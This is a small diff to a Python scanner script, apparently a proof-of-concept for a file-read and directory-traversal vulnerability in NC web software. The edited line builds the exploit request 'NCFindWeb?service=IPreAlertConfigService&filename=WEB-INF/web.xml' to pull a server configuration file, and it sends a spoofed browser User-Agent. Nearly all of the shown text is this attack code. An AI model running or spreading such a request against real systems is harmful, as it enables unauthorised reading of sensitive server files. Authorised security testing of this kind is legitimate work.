@@ -15,7 +15,7 @@ def main(target_url):
     if target_url[-1] != '/':
         target_url += '/'
     console.print(now_time() +  ' [INFO]     正在该NC网站是否存在目录遍历和任意文件读取漏洞',style='bold blue')
-    url = target_url + '/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml'
+    url = target_url + 'NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml'
     headers = {
         'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360'
     }
